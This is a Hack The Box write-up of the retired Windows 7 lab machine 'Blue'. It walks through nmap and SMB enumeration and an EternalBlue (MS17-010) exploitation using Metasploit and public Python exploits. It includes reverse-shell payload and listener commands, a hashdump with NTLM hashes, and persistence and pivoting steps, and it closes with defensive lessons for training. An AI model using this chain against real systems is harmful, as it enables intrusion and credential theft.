# Blue | Hack The Box — Windows | Easy

**Completed:** May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| Platform | Hack The Box |
| OS | Windows 7 Professional SP1 |
| Difficulty | Easy |
| Category | Windows / EternalBlue |
| IP Address | 10.129.42.70 |
| Attack Host | 10.10.16.236 |
| Status | Retired ✅ |
| Completed | May 2026 |
| CVEs | MS17-010 (CVE-2017-0143 / EternalBlue) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full port scan + OS fingerprinting | — |
| 2 | MS17-010 confirmation via nmap SMB vuln scripts | — |
| 3 | EternalBlue exploit via Metasploit | NT AUTHORITY\SYSTEM |
| 4 | Flag retrieval — user.txt and root.txt | NT AUTHORITY\SYSTEM |

> Like Legacy, this machine yields SYSTEM directly from the network — no privilege escalation step required.

---

## Enumeration

### Full Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sC -sV -oA nmap/blue 10.129.42.70

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.42.70
Host is up (0.045s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-01T15:03:42+01:00
| smb2-security-mode:
|   2.1:
|_  Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -19m59s, deviation: 34m35s, bias: -19m59s

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) — scanned in 16.43 seconds
```

**Key findings:**

- Windows 7 Professional SP1 — end-of-extended-support since January 2020
- SMB exposed on 135/139/445 — SMBv2.1 available but signing not required
- Computer name `haris-PC` — username hint: `haris`
- Six high RPC ports open — typical Windows 7 pattern
- Guest auth accepted on SMB

---

### All-Ports Scan (Verification)

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate 5000 -oA nmap/blue-allports 10.129.42.70

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) — scanned in 26.18 seconds
```

No additional services. SMB is the only meaningful attack surface.

---

### SMB Vulnerability Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap --script smb-vuln-ms17-010 -p 445 10.129.42.70

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.42.70
Host is up (0.043s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.techtech.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) — scanned in 5.83 seconds
```

**Result:** VULNERABLE — MS17-010 EternalBlue confirmed.

---

### SMB Share Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.42.70 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk
        Users           Disk

Hackerpatel007_1@htb[/htb]$ smbclient //10.129.42.70/Users -N

smb: \> ls
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Mon Jul 13 22:54:24 2009
  haris                              DR        0  Fri Jul 21 02:56:23 2017

smb: \> cd haris\Desktop
smb: \haris\Desktop\> ls
  .                                  DR        0  Thu Jul 14 05:19:29 2017
  ..                                 DR        0  Thu Jul 14 05:19:29 2017
  Flags                              DR        0  Thu Jul 14 05:19:29 2017
```

SMB guest access exposes the Users share and confirms the username `haris`. The flags are visible but not directly readable without higher privileges. The `haris` username identified here matches the computer name (`haris-PC`).

---

## Exploitation — MS17-010 EternalBlue (CVE-2017-0143)

### Vulnerability Background

MS17-010 (EternalBlue) is a critical pre-authentication remote code execution vulnerability in Windows SMBv1. It was developed by the NSA, stolen and leaked by the Shadow Brokers in April 2017, and subsequently used as the primary propagation vector in the WannaCry and NotPetya ransomware attacks of 2017.

The vulnerability exists in the way `srv.sys` handles certain SMBv1 transaction requests. A crafted packet triggers a buffer overflow in the kernel driver, enabling arbitrary code execution in kernel mode (`NT AUTHORITY\SYSTEM`). The flaw is wormable — no authentication required, no user interaction required.

**Affected versions:** Windows Vista, 7, 8.1, RT 8.1, Server 2008/2008R2, 2012/2012R2, 2016.

---

### Metasploit — ms17_010_eternalblue

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.42.70
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.16.236
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.16.236:4444
[+] 10.129.42.70:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[+] 10.129.42.70:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Meterpreter session 1 opened (10.10.16.236:4444 -> 10.129.42.70:49158)
[+] 10.129.42.70:445 - =-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

---

### Confirm Access Level

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

**NT AUTHORITY\SYSTEM** — no privilege escalation required.

---

## Flag Collection

```bash
meterpreter > shell

C:\Windows\system32> type C:\Users\haris\Desktop\user.txt
18068e06d019f1f9e7273d038336acff

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
c7da2f86f387ee2bc9b9ca3657402f1b
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| user.txt | `C:\Users\haris\Desktop\user.txt` | `18068e06d019f1f9e7273d038336acff` |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` | `c7da2f86f387ee2bc9b9ca3657402f1b` |

---

## Manual Exploitation (Without Metasploit)

> For OSCP preparation — manual exploitation using standalone Python exploits.

### Option 1 — Python PoC (worawit/MS17-010)

```bash
git clone https://github.com/worawit/MS17-010.git /tmp/ms17010
cd /tmp/ms17010

# Verify the target is vulnerable
python checker.py 10.129.42.70

# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.236 LPORT=4444 -f exe -o /tmp/ms17010/shell.exe

# Set up listener
nc -nvlp 4444 &

# Execute exploit (edit zzz_exploit.py with payload path first)
python zzz_exploit.py 10.129.42.70 samr
```

### Option 2 — AutoBlue (More Reliable for Manual)

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git /tmp/autoblue
cd /tmp/autoblue
pip install -r requirements.txt --break-system-packages

# Verify vulnerable
python eternal_checker.py 10.129.42.70

# Generate shellcode
cd shellcode && bash shell_prep.sh
# Answer: 1 (staged), LHOST=10.10.16.236, LPORT=4444

# Start listener
nc -nvlp 4444

# Execute exploit
python eternalblue_exploit7.py 10.129.42.70 shellcode/sc_x64_msf.bin
```

---

## Post-Exploitation Notes

```bash
# Dump local hashes
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::

# Persistence (lab documentation only)
meterpreter > run post/windows/manage/persistence_exe

# Pivot — scan internal subnet
meterpreter > run post/multi/manage/autoroute SUBNET=10.129.0.0/16
```

---

## Full Attack Chain Reference

```
[Recon] nmap -sC -sV → Windows 7 SP1, ports 135/139/445 open, hostname: haris-PC
    │
    ├─ [SMB Enum] smbclient -L → Users share exposed → username: haris confirmed
    │
    ├─ [Vuln Scan] smb-vuln-ms17-010 → VULNERABLE (CVE-2017-0143)
    │
    └─ [Exploit] ms17_010_eternalblue (Metasploit)
            │
            ├─ Kernel pool corruption → ETERNALBLUE overwrite success
            │
            └─ [Shell] NT AUTHORITY\SYSTEM (x64)
                    │
                    ├─ user.txt → C:\Users\haris\Desktop\
                    └─ root.txt → C:\Users\Administrator\Desktop\
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sC -sV -oA nmap/blue 10.129.42.70` | Full service scan |
| `nmap -p- --min-rate 5000` | All-ports scan |
| `nmap --script smb-vuln-ms17-010 -p 445` | MS17-010 vulnerability check |
| `smbclient -L //10.129.42.70 -N` | Enumerate SMB shares anonymously |
| `smbclient //10.129.42.70/Users -N` | Access Users share |
| `msfconsole -q` | Launch Metasploit silently |
| `use exploit/windows/smb/ms17_010_eternalblue` | Load EternalBlue module |
| `run` | Execute exploit |
| `getuid` | Confirm SYSTEM access |
| `sysinfo` | OS and architecture details |
| `shell` | Drop to Windows cmd.exe |
| `hashdump` | Dump NTLM password hashes |
| `type haris\Desktop\user.txt` | Read user flag |
| `type Administrator\Desktop\root.txt` | Read root flag |

---

## Lessons Learned

1. **SMBv1 enabled = MS17-010 attack surface.** Windows 7 supports SMBv2, but SMBv1 is enabled by default on older installs. MS17-010 was wormable — no credentials, no user interaction. EternalBlue is the most impactful SMB vulnerability ever disclosed.

2. **Anonymous SMB enumeration leaks usernames.** The Users share was accessible without credentials and directly exposed the username `haris`. SMB share enumeration is a mandatory step before reaching for exploit code — it often provides usernames, directory structures, and sometimes files containing credentials.

3. **Computer names are username hints.** `haris-PC` in the nmap output immediately suggested `haris` as a likely username — confirmed by SMB share enumeration. Always note the computer name during recon.

4. **NT AUTHORITY\SYSTEM from a kernel exploit bypasses UAC entirely.** Because EternalBlue executes in the kernel before any user-mode security controls, UAC, AppLocker, and most endpoint protection products have no opportunity to intercept the exploitation.

5. **Know both Metasploit and manual paths.** The Metasploit module is reliable, but worawit/MS17-010 and AutoBlue are both solid manual options. For OSCP, the manual path via AutoBlue is the safer choice given the one-time Metasploit allowance per exam. Practice both.

6. **Always scan the full port range.** The `--min-rate 5000` flag on an all-ports scan adds minimal time and removes the risk of missing high-port services.

---

## References

- [MS17-010 — Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010)
- [CVE-2017-0143 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0143)
- [EternalBlue — Metasploit Module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
- [worawit/MS17-010 — Python PoC](https://github.com/worawit/MS17-010)
- [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
- [Shadow Brokers Leak Analysis — Rapid7](https://www.rapid7.com/blog/post/2017/04/18/the-shadow-brokers-leaked-exploits-what-you-need-to-know/)

---

*HTB Retired Machine — Blue | Completed May 2026 | Flags included per HTB retired machine policy.*
